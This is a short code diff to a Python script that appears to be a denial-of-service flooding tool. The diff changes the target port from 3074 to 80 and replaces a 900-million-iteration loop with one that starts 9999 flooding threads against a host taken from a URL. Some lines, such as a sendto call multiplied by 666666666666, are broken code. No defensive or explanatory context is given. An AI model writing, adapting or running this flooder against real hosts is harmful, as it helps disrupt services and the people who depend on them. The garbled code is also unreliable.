@@ -91,7 +91,7 @@ def httpcall(url):
 	try:
 		
 			
-			s.sendto(bytes,(host,3074)) * 666666666666
+			s.sendto(bytes,(host,80)) * 666666666666
 			s.recv(1024)
 	except socket.error as e:
 			#print e.code
@@ -100,7 +100,7 @@ def httpcall(url):
 			code=500
 	else:
 			inc_counter()
-			s.sendto(bytes,(host,3074)) * 666666666666
+			s.sendto(bytes,(host,80)) * 666666666666
 			s.recv(1024)
 	return(code)
 
@@ -145,7 +145,7 @@ else:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
-		for i in xrange(900000000):
+		for i in range(9999):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
